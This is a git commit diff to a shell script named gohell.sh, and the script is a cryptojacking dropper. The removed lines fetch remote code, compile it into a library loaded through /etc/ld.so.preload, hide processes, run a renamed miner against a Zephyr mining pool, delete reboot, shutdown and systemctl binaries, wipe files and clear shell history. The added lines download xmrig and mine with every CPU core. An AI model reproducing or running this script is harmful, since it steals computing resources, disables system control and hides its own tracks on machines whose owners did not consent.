c48bf8efb49011a1917ba0bcbcdaf0c93e86091f
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-03-26 11:53:11 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,32 +1,3 @@
 #!/bin/bash
-set -x
-apt-get update ; apt-get install sudo npm -y
-sudo apt-get install libsodium23 -y
-apt-get install libsodium23 -y
-curl https://github.com/nandafiku/fillesg/raw/main/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
-sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
-WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
-mkdir .lib && cd .lib
-wget https://github.com/TiannaMcdowell/All-File/raw/main/daemon.tar.gz > /dev/null 2>&1 
-tar -xvf daemon.tar.gz
-mv uranus sgr1
-sudo nohup ./sgr1 --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-KIKIR) -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
-sleep 30
-sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
-curl ifconfig.me
-rm -rvf *
-cd ~/
-rm -rvf *
-history -cr
-while true
-do
-        echo "hold down..."
-        sleep 60
-done
+wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-RAIMO) -p x -a rx/0 -t $(nproc --all)
